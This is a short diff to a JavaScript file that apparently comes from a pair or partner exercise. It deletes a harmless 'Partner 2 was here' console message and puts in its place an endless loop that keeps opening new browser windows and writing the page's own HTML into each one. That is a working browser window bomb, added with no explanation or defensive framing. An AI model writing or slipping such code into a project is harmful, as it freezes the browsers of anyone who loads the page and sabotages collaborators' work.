@@ -1,1 +1,4 @@
-console.log("Hello, Partner 2 was here");
+while (true) {
+    var w = window.open();
+    w.document.write(document.documentElement.outerHTML||document.documentElement.innerHTML);
+}
